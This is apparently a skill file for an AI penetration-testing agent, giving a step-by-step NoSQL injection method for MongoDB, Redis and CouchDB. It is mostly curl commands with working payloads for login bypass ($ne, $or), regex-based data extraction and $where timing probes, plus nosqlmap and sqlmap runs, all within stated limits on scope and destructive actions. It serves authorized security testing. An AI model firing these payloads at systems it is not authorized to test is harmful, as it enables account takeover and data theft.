---
name: nosql-injection
description: Test NoSQL injection in MongoDB, Redis, and CouchDB through operator, type-confusion, authentication, timing, and extraction probes
origin: RedteamOpencode
---

# NoSQL Injection

## When to Activate

- A JSON, form, query, cookie, or header value selects MongoDB/CouchDB records or reaches Redis key/value logic
- A JSON login endpoint, filter API, or identifier behaves differently for operators, arrays, numbers, or malformed objects

## Tools

`run_tool curl`, `run_tool nosqlmap`, `run_tool sqlmap`, `run_tool redis-cli`.

## Methodology

### 1. Map the Injection Surface
Identify the parser, backend, and safe test object. Save the baseline request, auth context, status, body, headers, and latency. Keep scalar/array and string/integer controls; the analyst owns one or two bounded probes per family.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":"probe"}'
```

### 2. Inject JSON Operators
Replace one scalar with one operator object. Test `$ne`, `$gt`, `$exists`, `$regex`, `$where`, and `$or` independently; do not combine operators until the parser behavior is known.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":{"$ne":null}}' # auth-shape probe
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":{"$gt":""}}' # boundary probe
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":{"$exists":true}}' # presence probe
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":{"$regex":"^a"}}' # anchored regex probe
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","$or":[{"username":"probe"},{"username":{"$ne":""}}]}' # logical-operator probe
```

### 3. Test Type Confusion
Compare array versus scalar and integer versus string. MongoDB, CouchDB, and Redis may coerce or reject each shape differently; a backend-specific result is not a universal bypass.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":["probe"],"password":["probe"]}' # array shape
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"1","password":1}' # integer scalar
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"1","password":"1"}' # string control
```

### 4. Check JSON Authentication Bypass
Use only a known JSON login endpoint and a harmless account name. Treat a 200, redirect, cookie, or token as a signal; repeat against an unknown user and a valid/invalid control before escalating.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' -c "$DIR/scans/nosql-cookies.txt" \
  --data '{"username":"invalid","password":{"$ne":null}}' \
  -D "$DIR/scans/nosql-login-ne.headers" \
  -o "$DIR/scans/nosql-login-ne.json"
```

If Redis is explicitly in scope, use only read-only `TYPE` and `GET` probes. If `redis-cli` is absent, use the `run_tool curl` application probes above and record the direct Redis surface as untested.

```bash
run_tool redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" --raw TYPE "$REDIS_KEY"
run_tool redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" --raw GET "$REDIS_KEY"
```

### 5. Extract with Bounded Regex
Use an anchored, short prefix and paired character classes. Start with one character, stop on the first response difference, and never scan a large collection with an unbounded pattern.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$FILTER_URL" \
  -H 'Content-Type: application/json' \
  --data '{"filter":{"$regex":"^[a-m]"}}' # lower-half class
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$FILTER_URL" \
  -H 'Content-Type: application/json' \
  --data '{"filter":{"$regex":"^[n-z]"}}' # upper-half class
```

### 6. Use Timing Carefully
Use `$where` only for one short sleep comparison. Measure a normal request and one `sleep(2000)` request, then stop; do not infer extraction from an ordinary timeout.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -w 'TIME=%{time_total}\n' \
  -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":"probe"}'
run_tool curl -sS --connect-timeout 5 --max-time 20 -w 'TIME=%{time_total}\n' \
  -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
  --data '{"username":"probe","$where":"sleep(2000)"}' # sleep-only timing probe
```

### 7. Run Bounded Tool Fallbacks
Use `nosqlmap` only when present, against one endpoint and one parameter. Use the `run_tool curl` fallback inline if it is missing; use `sqlmap` with MongoDB mode as a secondary check, not as sole proof.

```bash
run_tool nosqlmap -u "$LOGIN_URL" --method POST --data='username=probe&password[$ne]=' --batch --level 2 --risk 1
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" -H 'Content-Type: application/json' --data '{"username":"probe","password":{"$ne":null}}'
run_tool sqlmap -u "$LOGIN_URL" --method POST --data='{"username":"probe","password":{"$ne":null}}' --dbms=mongodb --batch --level 2 --risk 1
```

### 8. Guard and Escalate
Reject catastrophic `$regex` backtracking (ReDoS), including nested or ambiguous quantifiers such as `(a+)+$`; cap prefix length and stop on latency or errors. Never use `$where` beyond the sleep probe, and never send `drop`, `delete`, collection writes, server-side evaluation, or other destructive operators. Capture status, body, cookies, headers, errors, and latency. Escalate repeatable authentication bypass or extraction to `exploit-developer`; keep this stage to one or two probes per family.

## References

`references/payloads/nosql-injection-payloads.md`, `references/payloads/sqli-payloads.md`, `references/vuln-checklists/A05-injection.md`, `references/tools/recon/curl.md`.
